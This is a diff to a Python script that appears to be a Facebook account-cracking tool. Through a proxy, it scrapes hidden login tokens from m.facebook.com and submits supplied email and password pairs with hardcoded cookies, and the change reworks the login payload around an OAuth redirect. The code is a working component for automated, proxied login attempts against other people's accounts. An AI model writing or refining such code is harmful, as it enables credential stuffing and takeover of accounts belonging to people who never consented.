@@ -1729,31 +1729,13 @@ def d(uid,pwx,tl):
             proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com').text
-            data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'true',
-            'bi_xrwh': '0',
-            'pass': pw,
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            data ={
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '',
-            'csr': '',
-            'req': '3',
-            'a': '',
-            '__user': '0',
-            '_fb_noscript': 'true',}
-            print(data)
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'next': 'https://m.facebook.com/dialog/oauth?client_id=124024574287414&locale=en_US&redirect_uri=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F&response_type=code%2Cgranted_scopes&scope=email&state=%7B%22fbLoginKey%22%3A%2217jtaou1jljf93iqzzj112vjdmyqssvorshf9ktdacmmxn9ag91%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D&ret=login&fbapp_pres=0&logger_id=e5428d80-85a0-4de8-9e72-860dccbb218a&tp=unspecified',
+            'flow': 'login_no_pin',
+            'pass': pw}                                   
             cookies = {
             'datr': 'QtBZZ5pdw9yXQJE0ZygUaI3n',
             'sb': 'QtBZZwQbIwtJ9ikr_rQjmuJI',
